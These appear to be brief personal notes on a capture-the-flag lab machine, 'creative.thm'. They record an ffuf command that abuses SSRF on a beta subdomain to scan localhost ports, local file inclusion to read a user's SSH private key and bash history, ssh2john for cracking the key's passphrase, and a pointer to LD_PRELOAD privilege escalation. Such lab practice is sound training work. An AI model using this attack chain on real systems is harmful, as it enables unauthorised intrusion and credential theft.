subdomain:
beta.creative.thm


## ssrf
port scan:
```bash
ffuf -u 'http://beta.creative.thm/' -d "url=http://127.0.0.1:FUZZ/" -w <(seq 1 65535) -H 'Content-Type: application/x-www-form-urlencoded' -mc all -t 100 -fs 13
```

LFI con ese endpoint.


### .ssh id_rsa
Phrase? 
ssh2john id_rsa > id_rsa.hash


### .bash_history

sudo -l
![[Pasted image 20240608223423.png]]

https://www.hackingarticles.in/linux-privilege-escalation-using-ld_preload/